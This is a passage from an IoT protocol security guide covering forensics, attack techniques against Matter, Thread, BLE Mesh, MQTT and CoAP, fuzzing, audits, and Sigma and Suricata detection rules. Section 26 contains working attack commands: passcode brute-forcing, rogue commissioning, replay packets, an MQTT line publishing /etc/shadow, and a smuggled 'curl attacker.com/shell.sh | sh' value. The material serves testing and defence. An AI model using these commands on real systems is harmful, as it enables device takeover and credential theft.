       encode(app_s_key, 'hex') AS appskey,
       f_cnt_up, n_f_cnt_down
FROM device_session
WHERE dev_eui = '\x0011223344556677';
```

With recovered session keys, decrypt captured LoRaWAN frames using `lorawan-parser` or Wireshark's LoRaWAN dissector (Preferences → Protocols → LoRaWAN → Session Keys).

### 25.5 IoT Device Memory Forensics for Protocol Artifacts

Constrained IoT devices store protocol state (keys, session tokens, peer addresses) in NVRAM, EEPROM, or flash. Physical extraction yields artifacts invisible to network captures.

**Common memory regions and protocol artifacts:**

| Device Platform | Memory Type | Protocol Artifacts | Extraction Tool |
|---|---|---|---|
| ESP32 (MQTT/BLE) | SPI flash (NVS partition) | Wi-Fi credentials, MQTT broker URI, TLS client cert, BLE bonding info | `esptool.py read_flash` → `nvs_partition_gen.py` |
| nRF52 (BLE/Thread) | Internal flash (FDS/NVS) | BLE LTK/IRK, Thread network key, Matter fabric credentials | J-Link + `nrfjprog --readcode` |
| CC2652 (Zigbee/Thread) | Internal flash (NV pages) | Zigbee NWK key, TC link key, PAN ID, channel, frame counters | TI UniFlash / JTAG extraction |
| STM32 (LoRaWAN) | Internal flash / EEPROM | AppKey, DevEUI, NwkSKey, AppSKey, frame counters | ST-LINK + `st-flash read` |
| Silicon Labs EFR32 (Zigbee/BLE) | Internal flash (NVM3) | Zigbee keys, BLE bonds, Thread credentials | Simplicity Commander |

**ESP32 MQTT credential extraction:**

```bash
# Dump entire flash
esptool.py --chip esp32 --port /dev/ttyUSB0 read_flash 0x0 0x400000 \
  /evidence/esp32_full_dump.bin

# Extract NVS partition (offset/size from partition table)
esptool.py --chip esp32 --port /dev/ttyUSB0 read_flash 0x9000 0x6000 \
  /evidence/esp32_nvs.bin

# Parse NVS partition for plaintext credentials
python3 -c "
import struct
with open('/evidence/esp32_nvs.bin', 'rb') as f:
    data = f.read()
# Search for common MQTT config strings
for pattern in [b'mqtt://', b'mqtts://', b'ssl://', b'tcp://']:
    idx = data.find(pattern)
    if idx != -1:
        end = data.find(b'\x00', idx)
        print(f'Found at 0x{idx:04x}: {data[idx:end].decode(errors=\"replace\")}')
"
```

### 25.6 Timeline Reconstruction from Multi-Protocol Captures

IoT incidents frequently span multiple protocols (e.g., BLE compromise → Thread pivot → MQTT C2). Correlating timestamps across captures requires clock normalization.

**Merge multi-protocol captures into unified timeline:**

```bash
# Merge PCAPs from different capture sources (all must be pcapng or pcap)
mergecap -w /evidence/merged_timeline.pcapng \
  /evidence/ble_capture.pcapng \
  /evidence/zigbee_capture.pcap \
  /evidence/mqtt_capture.pcapng

# Apply time offset correction if capture clocks were unsynchronized
editcap -t 3.5 /evidence/zigbee_capture.pcap /evidence/zigbee_corrected.pcap

# Generate CSV timeline for correlation
tshark -r /evidence/merged_timeline.pcapng \
  -T fields -e frame.time_epoch -e frame.protocols -e _ws.col.Info \
  -E separator=, -E quote=d \
  > /evidence/unified_timeline.csv
```

**Timeline correlation checklist:**

1. Normalize all timestamps to UTC ISO 8601
2. Account for clock drift between capture devices (GPS-sync if possible)
3. Correlate BLE advertising → connection events with MQTT connect/publish timestamps
4. Map Zigbee join/rejoin events to gateway uplink logs
5. Cross-reference device serial numbers across protocols (BLE MAC ↔ Zigbee EUI-64 ↔ MQTT client ID)

### 25.7 Evidence Preservation for IoT Incident Response

IoT evidence is volatile: devices reboot, frame counters increment, session keys rotate, and constrained flash gets overwritten.

**Preservation priority (most volatile first):**

1. **Active radio captures** — start sniffing immediately; stop only after sufficient coverage
2. **Device RAM** — JTAG/SWD dump before power cycle if physically accessible
3. **Broker/gateway session state** — export before device reconnects and overwrites session
4. **Device flash** — extract full firmware dump including NVS/NVRAM
5. **Network server databases** — snapshot/export session tables
6. **Cloud platform logs** — export via API before retention window closes

**Hashing and chain-of-custody:**

```bash
# Hash all evidence files immediately after acquisition
find /evidence/ -type f -exec sha256sum {} \; > /evidence/manifest_sha256.txt

# Sign the manifest with GPG for non-repudiation
gpg --armor --detach-sign /evidence/manifest_sha256.txt

# Create a read-only archive
tar czf /evidence/case_$(date +%Y%m%d_%H%M%S)_sealed.tar.gz \
  --owner=root --group=root /evidence/
chmod 444 /evidence/case_*_sealed.tar.gz
```

---

## 26. Advanced IoT Protocol Attacks

This section covers attack techniques against newer IoT protocol features — Matter/Thread ecosystem attacks, BLE Mesh exploitation, MQTT 5.0 feature abuse, and cross-protocol pivoting.

### 26.1 Matter Protocol Security Analysis

Matter (formerly Project CHIP) uses two session establishment protocols: PASE (Passcode-Authenticated Session Establishment, based on SPAKE2+) for commissioning and CASE (Certificate-Authenticated Session Establishment) for operational communication. Both run over MRP (Message Reliability Protocol) atop UDP.

**PASE weaknesses — passcode brute-force:**

Matter PASE uses an 8-digit setup code (11-bit discriminator + 27-bit passcode). The 27-bit passcode yields ~134 million possibilities. SPAKE2+ is designed to be offline-brute-force-resistant, but a weak implementation or side-channel leak during the PASE exchange could expose the verifier.

```bash
# chip-tool: attempt commissioning with candidate passcodes
# (requires physical proximity — BLE or Wi-Fi local transport)
for code in $(seq 10000000 10001000); do
    timeout 5 chip-tool pairing ble-wifi 1 "TestSSID" "TestPass" $code 3840 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[!] Valid passcode found: $code"
        break
    fi
done
```

**CVE-2023-1530** (Chromium/WebBLE): while not Matter-specific, this BLE vulnerability in Chromium-based commissioners could allow a malicious webpage to interact with Matter BLE commissioning advertisements. Impact: unauthorized commissioner initiation.

**Commissioner impersonation — rogue fabric injection:**

If an attacker completes PASE (e.g., via a leaked QR code or default passcode), they can commission the device into their own fabric. The device then trusts the attacker's NOC (Node Operational Certificate) chain.

```bash
# Attacker commissions a device into their rogue fabric
chip-tool pairing ble-wifi 1 "AttackerSSID" "AttackerPass" 20202021 3840

# Device now responds to attacker's operational commands
chip-tool onoff toggle 1 1

# Attacker reads device attributes including network credentials
chip-tool basicinformation read-by-id 1 0 0xFFFFFFFF
```

Mitigation: enforce per-device unique passcodes (not the default `20202021`), revoke fabrics via `chip-tool operationalcredentials remove-fabric`, and implement Enhanced Setup Flow with user confirmation.

### 26.2 Thread Network Partition Attacks

Thread uses MLE (Mesh Link Establishment) for neighbor discovery and routing topology. A rogue Thread device can inject MLE advertisements to disrupt the routing topology.

**Router ID exhaustion:**

Thread networks support a maximum of 32 active Routers. An attacker flooding MLE Link Request messages with unique Router IDs can exhaust the Router ID space, preventing legitimate devices from becoming routers.

```bash
# Using OpenThread CLI on a rogue dongle
# Force the device to become a router and advertise aggressively
ot-cli-ftd
> ifconfig up
> thread start
> state router
> routerselectionjitter 1
# Repeat on multiple dongles to exhaust 32 router slots
```

**Partition attack via MLE spoofing:**

Thread networks merge partitions when leaders advertise higher partition IDs. An attacker spoofing MLE Advertisements with a high partition ID can cause network splits.

**CVE-2022-39064** (OpenThread): stack overflow via malformed MLE message — exploitable for DoS or potential RCE on Thread Border Routers running unpatched OpenThread.

### 26.3 BLE Mesh Replay and Relay Attacks

BLE Mesh protects against replay using a 24-bit sequence number (SEQ) and a 32-bit IV Index. However, weaknesses exist in the relay mechanism and provisioning process.

**Replay attack via IV Index rollback:**

If an attacker captures traffic during an IV Index Update procedure (which takes a minimum of 96 hours), they can attempt to replay old messages with the previous IV Index to nodes that have not yet completed the transition.

**Relay attack — message amplification:**

BLE Mesh relay nodes rebroadcast messages with TTL > 1. An attacker can abuse this by injecting high-TTL messages into a dense mesh, causing amplification. Each relay node re-advertises the message on all three advertising channels.

```python
# Construct a BLE Mesh replay packet using scapy
from scapy.all import *
from scapy.layers.bluetooth4LE import *

# Replayed mesh message with valid SEQ but previous IV Index
mesh_pdu = bytes.fromhex(
    '6809'        # Mesh Network PDU, IVI=0, NID=0x09
    '00000001'    # SEQ=1 (replayed)
    'c001'        # SRC=0xC001
    'c002'        # DST=0xC002
    # TransportPDU (encrypted with old key)
    'aabbccdd'
    'eeff0011'
)

# BLE advertising packet carrying the mesh PDU
adv = BTLE() / BTLE_ADV() / BTLE_ADV_NONCONN_IND(
    AdvA='aa:bb:cc:dd:ee:ff'
) / Raw(load=b'\x2a\x18' + mesh_pdu)  # Mesh Proxy AD type
sendp(adv, iface='hci0')
```

**CVE-2020-26556** (Bluetooth SIG): BLE Mesh Provisioning Protocol allows a MitM attacker to identify the AuthValue used during provisioning when a static OOB method is employed. CVSSv3: 7.5. CWE-287.

**CVE-2020-26559** (Bluetooth SIG): BLE Mesh Provisioning Protocol allows an attacker to impersonate a device being provisioned by exploiting a vulnerability in the authentication process when no OOB data is available. CVSSv3: 8.8. CWE-287.

### 26.4 MQTT 5.0 Feature Abuse

MQTT 5.0 introduced shared subscriptions, topic aliases, user properties, and flow control. These features expand the attack surface.

**Shared subscription abuse for data interception:**

MQTT 5.0 shared subscriptions (`$share/group/topic`) distribute messages across subscribers in the same group. An attacker who subscribes to a shared group can intercept messages intended for legitimate consumers.

```bash
# Attacker joins a shared subscription group
mosquitto_sub -h broker.target.local -p 8883 \
  --cafile ca.pem \
  -t '$share/sensor-processors/devices/+/telemetry' \
  -v --id attacker-client

# The broker now load-balances messages across legitimate consumers
# AND the attacker — the attacker sees a fraction of all telemetry
```

**Topic alias for data exfiltration:**

MQTT 5.0 topic aliases map integer IDs to topic strings. After the initial PUBLISH with the full topic, subsequent messages use only the alias integer. IDS/IPS rules that match on topic strings miss aliased traffic.

```bash
# Attacker publishes sensitive data to a C2 topic using topic alias
# First PUBLISH: sets alias 1 → 'innocent/status'
# Subsequent PUBLISH: uses alias 1 but broker routes to actual topic
mosquitto_pub -h broker.target.local -p 8883 \
  --cafile ca.pem \
  -t 'exfil/stolen-data' \
  -m "$(cat /etc/shadow)" \
  -D PUBLISH topic-alias 1

# Subsequent messages reference alias 1 — no topic string on the wire
mosquitto_pub -h broker.target.local -p 8883 \
  --cafile ca.pem \
  -m "more-stolen-data" \
  -D PUBLISH topic-alias 1
```

**CVE-2023-0809** (Mosquitto): memory leak in MQTT 5.0 when clients send CONNECT packets with a will message containing invalid property lengths. Repeated exploitation causes broker OOM. CVSSv3: 5.3. CWE-401.

**CVE-2023-28366** (Mosquitto): memory leak in Mosquitto broker triggered by QoS 2 message flow where the client disconnects before completing the PUBCOMP handshake. CVSSv3: 7.5. CWE-401.

**CVE-2023-3592** (Mosquitto): memory leak when a MQTT v5 client sends a CONNECT with a will message containing user properties that exceed broker limits. CVSSv3: 7.5. CWE-401.

### 26.5 CoAP Observe Notification Flooding

CoAP Observe (RFC 7641) allows clients to register interest in a resource and receive asynchronous notifications. A compromised or malicious CoAP server can flood registered observers with notifications.

**Attack scenario:**

1. Attacker compromises a CoAP server or registers a malicious resource
2. Legitimate clients subscribe to the resource via Observe
3. Attacker triggers rapid state changes, generating a notification per change
4. Constrained clients (battery-powered sensors) are overwhelmed processing notifications

```bash
# Using aiocoap to simulate observe flooding
python3 -c "
import asyncio
import aiocoap

async def flood():
    context = await aiocoap.Context.create_server_context(
        bind=('0.0.0.0', 5683))
    # Server-side: rapidly change observed resource
    for i in range(10000):
        # Each change triggers notification to all observers
        await asyncio.sleep(0.001)
        # Resource state change logic triggers CON notifications

asyncio.run(flood())
"
```

Mitigation: configure `MAX_OBSERVING` limits on clients, implement notification rate limiting on servers, use CoAP `Max-Age` option to reduce polling frequency.

### 26.6 Cross-Protocol Attacks

IoT devices frequently bridge multiple protocols. A compromise at one protocol layer enables lateral movement across protocol boundaries.

**BLE → Thread pivot:**

Matter devices use BLE for commissioning and Thread for operation. An attacker who compromises BLE commissioning gains the Thread network credentials (passed during the commissioning window).

```
Attack chain:
1. Capture BLE commissioning (PASE over BLE)
2. Extract Thread operational dataset from commissioning payload
3. Join Thread network with rogue device using extracted credentials
4. Access all Thread mesh devices directly
```

**MQTT → Cloud lateral movement:**

IoT devices authenticating to cloud MQTT brokers (AWS IoT Core, Azure IoT Hub) receive scoped credentials. Overly permissive IoT policies allow lateral movement.

```bash
# Attacker with compromised device certificate
# Check permitted MQTT topics (AWS IoT)
aws iot test-authorization \
  --principal "arn:aws:iot:us-east-1:123456789012:cert/abc123" \
  --auth-infos '[{"actionType":"PUBLISH","resources":["arn:aws:iot:us-east-1:123456789012:topic/*"]}]'

# If policy allows wildcard topic publish:
mosquitto_pub -h a1b2c3d4e5f6g7.iot.us-east-1.amazonaws.com -p 8883 \
  --cafile AmazonRootCA1.pem \
  --cert compromised-device.pem.crt \
  --key compromised-device.pem.key \
  -t '$aws/things/other-device/shadow/update' \
  -m '{"state":{"desired":{"command":"malicious_payload"}}}'
```

**Zigbee → IP pivot via gateway:**

Zigbee coordinators (Zigbee2MQTT, ZHA) bridge Zigbee traffic to IP-based MQTT/HTTP. Compromising a Zigbee device can lead to command injection on the gateway if input sanitization is absent.

```bash
# Zigbee device sends a crafted model identifier containing shell metacharacters
# If Zigbee2MQTT logs or processes this unsanitized:
# model_id = "sensor; curl http://attacker.com/shell.sh | sh"
# This is a real attack vector — Zigbee2MQTT has historically passed
# device-reported strings to shell commands without escaping
```

**CVE-2021-28139** (ESP32 BLE): heap buffer overflow in Espressif ESP32 BLE stack triggered by oversized LMP packets. Exploitable for RCE from BLE proximity. CVSSv3: 8.8. CWE-787. Impact on cross-protocol: compromised ESP32 running MQTT+BLE can pivot from BLE to cloud MQTT.

---

## 27. IoT Protocol Testing Methodology

Structured methodology for IoT protocol penetration testing, fuzzing, lab setup, and compliance testing.

### 27.1 IoT Protocol Fuzzing

**MQTT fuzzing with boofuzz:**

```python
#!/usr/bin/env python3
"""MQTT CONNECT packet fuzzer using boofuzz."""
from boofuzz import *

def mqtt_connect_fuzz():
    session = Session(
        target=Target(
            connection=TCPSocketConnection("target-broker.local", 1883)
        ),
        sleep_time=0.1,
    )

    # MQTT Fixed Header
    s_initialize("MQTT_CONNECT")

    # Packet type (CONNECT = 0x10) + remaining length
    s_byte(0x10, name="packet_type", fuzzable=False)
    s_size("connect_payload", length=1, name="remaining_length",
           math=lambda x: x, fuzzable=True)

    with s_block("connect_payload"):
        # Protocol Name
        s_word(0x0004, endian=BIG_ENDIAN, name="proto_name_len")
        s_string("MQTT", name="proto_name", max_len=10)

        # Protocol Level (4 = MQTT 3.1.1, 5 = MQTT 5.0)
        s_byte(0x04, name="proto_level")

        # Connect Flags
        s_byte(0xC2, name="connect_flags")

        # Keep Alive
        s_word(60, endian=BIG_ENDIAN, name="keep_alive")

        # Client ID
        s_word(0x0008, endian=BIG_ENDIAN, name="client_id_len")
        s_string("fuzz0001", name="client_id", max_len=65535)

        # Username (if flag set)
        s_word(0x0005, endian=BIG_ENDIAN, name="username_len")
        s_string("admin", name="username", max_len=65535)

        # Password (if flag set)
        s_word(0x0008, endian=BIG_ENDIAN, name="password_len")
        s_string("password", name="password", max_len=65535)

    session.connect(s_get("MQTT_CONNECT"))
    session.fuzz()

if __name__ == "__main__":
    mqtt_connect_fuzz()
```

**CoAP fuzzing with boofuzz:**

```python
#!/usr/bin/env python3
"""CoAP GET request fuzzer using boofuzz over UDP."""
from boofuzz import *

session = Session(
    target=Target(
        connection=UDPSocketConnection("target-coap.local", 5683)
    ),
)

s_initialize("CoAP_GET")
# CoAP header: Ver=1, Type=CON, TKL=1, Code=GET (0.01)
s_byte(0x41, name="ver_type_tkl")
s_byte(0x01, name="code_get")
s_word(0x0001, endian=BIG_ENDIAN, name="message_id")
s_byte(0xAA, name="token")
# Option: Uri-Path
s_byte(0xB4, name="option_delta_length")  # delta=11 (Uri-Path), length=4
s_string("test", name="uri_path", max_len=255)

session.connect(s_get("CoAP_GET"))
session.fuzz()
```

**Zigbee fuzzing with KillerBee:**

```bash
# Zigbee beacon request fuzzer
zbfuzz -f 15 -c 0 -p beacon_request -n 10000

# Zigbee association request fuzzer
zbfuzz -f 15 -c 0 -p association -n 10000

# Custom frame fuzzing with zbscapy
python3 -c "
from killerbee import *
from scapy.layers.dot15d4 import *
import random

kb = KillerBee()
kb.set_channel(15)

for i in range(1000):
    # Fuzz the NWK header fields
    frame = Dot15d4FCS() / Dot15d4Data() / Raw(
        load=bytes([random.randint(0, 255) for _ in range(random.randint(5, 100))])
    )
    kb.inject(bytes(frame))
"
```

### 27.2 Automated Vulnerability Scanning

**IoT protocol scanner — nmap NSE scripts:**

```bash
# MQTT broker enumeration and auth check
nmap -p 1883,8883 --script mqtt-subscribe target-broker.local

# CoAP resource discovery
nmap -p 5683 -sU --script coap-resources target-coap.local

# BLE service enumeration (requires BLE adapter)
# Use dedicated tools instead:
sudo hcitool lescan --duplicates | tee /tmp/ble_scan.log &
sleep 10 && kill %1

# For each discovered device:
gatttool -b AA:BB:CC:DD:EE:FF --primary
gatttool -b AA:BB:CC:DD:EE:FF --characteristics
```

**MQTT security audit script:**

```bash
#!/usr/bin/env bash
# mqtt_audit.sh — comprehensive MQTT broker security assessment
BROKER="$1"
PORT="${2:-1883}"

echo "=== MQTT Security Audit: ${BROKER}:${PORT} ==="
echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] Starting audit"

# 1. Anonymous access check
echo -e "\n--- Anonymous Access ---"
timeout 5 mosquitto_sub -h "$BROKER" -p "$PORT" -t '$SYS/#' -C 1 -W 3 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[CRITICAL] Anonymous access permitted — $SYS topics readable"
else
    echo "[OK] Anonymous access denied"
fi

# 2. Wildcard subscription check
echo -e "\n--- Wildcard Subscription ---"
timeout 5 mosquitto_sub -h "$BROKER" -p "$PORT" -t '#' -C 1 -W 3 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[CRITICAL] Wildcard subscription '#' permitted for anonymous"
else
    echo "[OK] Wildcard subscription denied"
fi

# 3. $SYS topic information disclosure
echo -e "\n--- $SYS Information Disclosure ---"
for topic in '$SYS/broker/version' '$SYS/broker/clients/connected' \
             '$SYS/broker/uptime' '$SYS/broker/load/messages/received/1min'; do
    result=$(timeout 3 mosquitto_sub -h "$BROKER" -p "$PORT" -t "$topic" -C 1 -W 2 2>/dev/null)
    if [ -n "$result" ]; then
        echo "[HIGH] ${topic}: ${result}"
    fi
done

# 4. TLS check
echo -e "\n--- TLS Configuration ---"
timeout 5 openssl s_client -connect "${BROKER}:8883" -brief 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[OK] TLS available on port 8883"
else
    echo "[HIGH] TLS not available or misconfigured on port 8883"
fi

echo -e "\n[$(date -u +%Y-%m-%dT%H:%M:%SZ)] Audit complete"
```

### 27.3 OWASP IoT Testing Guide Mapping

| OWASP IoT Top 10 | Protocol Testing Area | Tools | Test Method |
|---|---|---|---|
| I1: Weak/default passwords | MQTT auth, BLE pairing, Matter PASE | `mosquitto_sub`, `chip-tool`, `crackle` | Attempt default creds, brute-force |
| I2: Insecure network services | All exposed protocol ports | `nmap`, `masscan`, `coap-client` | Port scan, service enumeration |
| I3: Insecure ecosystem interfaces | MQTT ACLs, CoAP resource permissions | `mqtt-pwn`, `aiocoap` | Permission boundary testing |
| I4: Lack of secure update | OTA over BLE/MQTT/CoAP | Firmware extraction, MITM proxy | Intercept OTA, check signing |
| I5: Use of insecure components | Protocol stack versions | CVE scanning, `sbom-tool` | Match stack version to CVE DB |
| I6: Insufficient privacy | MQTT topic structure, BLE advertising | Traffic analysis, `btlejack` | Check for PII in protocol fields |
| I7: Insecure data transfer | MQTT without TLS, CoAP without DTLS | Wireshark, `tcpdump` | Capture and inspect cleartext |
| I8: Lack of device management | LwM2M bootstrap, Thread commissioning | LwM2M client tools, `ot-cli` | Test enrollment/decommissioning |
| I9: Insecure default settings | Mosquitto defaults, Zigbee TC policy | Config audit | Compare defaults to hardened baseline |
| I10: Lack of physical hardening | JTAG/SWD exposed, debug UART | `openocd`, logic analyzers | Probe debug interfaces |

### 27.4 Lab Setup — Radio Equipment and Test Network Architecture

**Minimum lab equipment for IoT protocol testing:**

| Protocol | Hardware | Approximate Cost | Software |
|---|---|---|---|
| BLE | Ubertooth One + nRF52840 DK | $150 + $40 | Wireshark, btlejack, nRF Connect |
| Zigbee | CC2531 USB dongle (×2) + CC2652 dev board | $10 + $30 | KillerBee, Zigbee2MQTT, Wireshark |
| Thread/Matter | nRF52840 DK (×3) + Raspberry Pi (OTBR) | $120 + $50 | OpenThread, chip-tool, Wireshark |
| LoRaWAN | RAK2287 gateway + LoRa32 end devices (×2) | $100 + $30 | ChirpStack, LoRa packet decoder |
| Z-Wave | Z-Wave.Me UZB7 stick + Aeotec Z-Stick 7 | $40 + $40 | Z-Wave JS, Wireshark (z-wave dissector) |
| MQTT/CoAP | Standard Linux VM or container | $0 | Mosquitto, Californium, Wireshark |

**Isolated test network architecture:**

```
┌──────────────────────────────────────────────────────────┐
│                   ISOLATED LAB NETWORK                    │
│  (air-gapped or VLAN-isolated from production)           │
│                                                          │
│  ┌─────────┐   ┌──────────┐   ┌────────────┐           │
│  │ RF Test  │   │  IoT GW  │   │ Protocol   │           │
│  │ Devices  │   │ (Zigbee  │   │ Analyzer   │           │
│  │          │◄──┤  2MQTT / │──►│ (Wireshark  │           │
│  │ Sensors  │   │  OTBR)   │   │  host)     │           │
│  └─────────┘   └────┬─────┘   └────────────┘           │
│       ▲              │                                    │
│       │         ┌────┴─────┐                             │
│  ┌────┴───┐     │  MQTT    │     ┌──────────┐           │
│  │Sniffer │     │  Broker  │     │ Attacker │           │
│  │(Uber-  │     │(Mosquitto│     │ Workstation│          │
│  │ tooth/ │     │  / EMQX) │     │ (Kali +   │          │
│  │ CC2531)│     └──────────┘     │  IoT tools)│          │
│  └────────┘                      └──────────┘           │
└──────────────────────────────────────────────────────────┘
```

### 27.5 Compliance Testing

**Matter certification testing:**

```bash
# Run Matter Test Harness (TH) against a DUT (Device Under Test)
# Install the Matter TH from CSA
cd ~/matter-test-harness
python3 -m chip.testing.test_runner \
  --dut-ip 192.168.1.100 \
  --dut-port 5540 \
  --test-suite TC-SC  # Security test suite
  # TC-SC-1.1: PASE session establishment
  # TC-SC-2.1: CASE session establishment
  # TC-SC-3.1: Session resumption
  # TC-SC-4.1: Group key management
```

**Zigbee Alliance compliance (Zigbee PRO):**

Test areas: network formation, security key establishment, application-layer interop. Requires Zigbee Test Harness and certified test equipment.

**LoRaWAN Alliance certification:**

End devices must pass LoRaWAN Certification Test Tool (LCTT) validation covering:
- OTAA join procedure compliance
- ABP session handling
- MAC command handling
- Class A/B/C timing compliance
- Regional parameter compliance (EU868, US915, etc.)

---

## 28. IoT Protocol Monitoring and Anomaly Detection

Production monitoring of IoT protocol traffic for threat detection, with concrete detection rules and SIEM integration patterns.

### 28.1 Network Behavioral Analysis — Baseline Establishment

IoT devices exhibit highly predictable communication patterns. Baseline these patterns to detect anomalies.

**Baseline metrics to collect:**

| Metric | Normal Range (example: temperature sensor) | Anomaly Indicator |
|---|---|---|
| MQTT publish frequency | 1 msg / 60s ± 5% | Burst > 10 msg/s or silence > 300s |
| MQTT topic set | `devices/{id}/telemetry`, `devices/{id}/status` | New topic never seen before |
| Payload size | 50-200 bytes | > 1KB or < 10 bytes |
| Connection duration | Persistent (hours/days) | Frequent reconnect (< 60s intervals) |
| TLS cipher suite | TLS_AES_128_GCM_SHA256 | Downgrade to NULL or export cipher |
| BLE advertising interval | 1000ms ± 10% | < 100ms (aggressive scanning) |
| Zigbee frame counter | Monotonically increasing | Reset or decrement (replay indicator) |

**Baseline collection script (MQTT):**

```bash
#!/usr/bin/env bash
# mqtt_baseline.sh — collect behavioral baseline for IoT MQTT fleet
BROKER="$1"
DURATION="${2:-3600}"  # default 1 hour
OUTPUT="/var/log/iot-baseline/mqtt_$(date +%Y%m%d_%H%M%S).jsonl"

mosquitto_sub -h "$BROKER" -p 8883 \
  --cafile /etc/mqtt/ca.pem \
  -t 'devices/#' -v \
  | timeout "$DURATION" \
    jq -Rc --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
    'split(" ") | {timestamp: $ts, topic: .[0], payload_len: (.[1:] | join(" ") | length)}' \
  > "$OUTPUT"

echo "Baseline collected: $(wc -l < "$OUTPUT") messages in ${DURATION}s"
```

### 28.2 Sigma Rules for IoT Protocol Anomalies

**Unusual MQTT topic pattern — potential C2 or exfiltration:**

```yaml
title: MQTT Suspicious Topic Pattern — Potential C2 Channel
id: 8a2f3c1e-4d5b-6e7f-8a9b-0c1d2e3f4a5b
status: experimental
description: |
    Detects MQTT publish/subscribe to topics matching known C2 patterns
    or anomalous topic structures not in the device baseline.
author: IoT Security Team
date: 2025-03-15
tags:
    - attack.command_and_control
    - attack.t1071.001
    - iot.mqtt
logsource:
    category: mqtt
    product: mosquitto
    service: broker
detection:
    selection_c2_topics:
        mqtt.topic|contains:
            - '$SYS/'
            - 'cmd/'
            - 'shell/'
            - 'exec/'
            - 'config/update'
            - '../'
    selection_exfil_patterns:
        mqtt.topic|re: '.*\/(etc|proc|sys|tmp|dev)\/(passwd|shadow|hosts|cpuinfo).*'
    selection_topic_traversal:
        mqtt.topic|contains:
            - '%2f'
            - '%2F'
            - '\x00'
    condition: selection_c2_topics or selection_exfil_patterns or selection_topic_traversal
level: high
falsepositives:
    - Legitimate system monitoring publishing to $SYS topics
    - Device management platforms using 'config/update' topics
```

**BLE advertising anomaly — rogue device detection:**

```yaml
title: BLE Anomalous Advertising — Potential Rogue Device
id: 9b3e4d2f-5c6a-7d8e-9f0a-1b2c3d4e5f6a
status: experimental
description: |
    Detects BLE devices advertising with characteristics inconsistent
    with the known fleet baseline — new UUIDs, aggressive intervals,
    or spoofed device names.
author: IoT Security Team
date: 2025-03-15
tags:
    - attack.initial_access
    - attack.t1200
    - iot.ble
logsource:
    category: ble
    product: nrf_sniffer
detection:
    selection_aggressive_adv:
        ble.adv_interval|lt: 100  # ms — normal IoT is 200-10000ms
    selection_unknown_uuid:
        ble.service_uuid|not_in:
            - '0x1800'  # Generic Access
            - '0x1801'  # Generic Attribute
            - '0x180A'  # Device Information
            - '0x180F'  # Battery Service
            - '0xFFF1'  # Custom fleet service UUID
    selection_name_spoof:
        ble.local_name|contains:
            - 'Free'
            - 'AirDrop'
            - 'Setup'
    condition: selection_aggressive_adv or (selection_unknown_uuid and selection_name_spoof)
level: medium
falsepositives:
    - New legitimate devices not yet added to baseline
    - Firmware updates changing advertising parameters
```

**MQTT connection anomaly — brute-force or credential stuffing:**

```yaml
title: MQTT Rapid Connection Failures — Brute Force Attempt
id: 7c4d5e3a-6b7c-8d9e-0f1a-2b3c4d5e6f7a
status: experimental
description: |
    Detects multiple failed MQTT CONNECT attempts from the same source,
    indicating credential brute-force against the MQTT broker.
author: IoT Security Team
date: 2025-03-15
tags:
    - attack.credential_access
    - attack.t1110.001
    - iot.mqtt
logsource:
    category: mqtt
    product: mosquitto
    service: broker
detection:
    selection:
        mqtt.event_type: 'CONNECT'
        mqtt.return_code|gt: 0  # Non-zero = failure
    condition: selection | count(source.ip) by source.ip > 10
    timeframe: 5m
level: high
falsepositives:
    - Device fleet reboot with expired credentials
    - Certificate rotation window
```

### 28.3 Suricata Rules for IoT Protocol Inspection

```yaml
# /etc/suricata/rules/iot-protocols.rules

# MQTT — Detect anonymous CONNECT (no username/password flags)
alert tcp any any -> any 1883 (
    msg:"IOT-MQTT Anonymous CONNECT — no auth flags set";
    flow:to_server,established;
    content:"|10|";  offset:0; depth:1;          # CONNECT packet type
    byte_test:1,!&,0xC0,9;                       # Connect flags byte — bits 7,6 = user/pass
    classtype:policy-violation;
    sid:4000001; rev:1;
    metadata:iot mqtt, mitre_attack T1078;
)

# MQTT — Detect wildcard subscription '#'
alert tcp any any -> any 1883 (
    msg:"IOT-MQTT Wildcard subscription '#' — potential data harvesting";
    flow:to_server,established;
    content:"|82|";  offset:0; depth:1;          # SUBSCRIBE packet type
    content:"|00 01 23|";                         # Topic length=1, topic='#'
    classtype:policy-violation;
    sid:4000002; rev:1;
    metadata:iot mqtt, mitre_attack T1040;
)

# MQTT — Detect $SYS topic subscription (information disclosure)
alert tcp any any -> any 1883 (
    msg:"IOT-MQTT $SYS topic subscription — broker info disclosure";
    flow:to_server,established;
    content:"|82|";  offset:0; depth:1;
    content:"$SYS/";
    classtype:attempted-recon;
    sid:4000003; rev:1;
    metadata:iot mqtt, mitre_attack T1018;
)

# CoAP — Detect unauthenticated resource discovery
alert udp any any -> any 5683 (
    msg:"IOT-COAP Unauthenticated resource discovery /.well-known/core";
    content:"|41 01|";  offset:0; depth:2;       # CON GET
    content:".well-known";
    classtype:attempted-recon;
    sid:4000010; rev:1;
    metadata:iot coap, mitre_attack T1046;
)

# CoAP — Detect observe registration flood
alert udp any any -> any 5683 (
    msg:"IOT-COAP Observe registration flood";
    content:"|41 01|";  offset:0; depth:2;
    byte_test:1,&,0x01,3;                        # Observe option = register
    threshold:type both, track by_src, count 50, seconds 10;
    classtype:attempted-dos;
    sid:4000011; rev:1;
    metadata:iot coap, mitre_attack T1498;
)

# MQTT over TLS — Detect connections to common MQTT TLS port
# (For visibility only — payload is encrypted)
alert tcp any any -> any 8883 (
    msg:"IOT-MQTT TLS connection detected — log for correlation";
    flow:to_server,established;
    tls.sni; content:"mqtt";
    classtype:not-suspicious;
    sid:4000020; rev:1;
    metadata:iot mqtt;
)

# Zigbee/802.15.4 — Detect via Ethernet-encapsulated ZEP frames
# (ZigBee Encapsulation Protocol — used by Zigbee sniffers forwarding to Wireshark)
alert udp any any -> any 17754 (
    msg:"IOT-ZIGBEE ZEP encapsulated traffic detected — sniffer active";
    content:"|45 58|";  offset:0; depth:2;       # ZEP magic "EX"
    classtype:policy-violation;
    sid:4000030; rev:1;
    metadata:iot zigbee;
)
```

### 28.4 IoT-Specific SIEM Integration Patterns

**Log source onboarding for IoT protocols:**

| Source | Log Format | Collection Method | SIEM Parser |
|---|---|---|---|
| Mosquitto broker | Syslog / file | Filebeat → Logstash | MQTT-specific grok patterns |
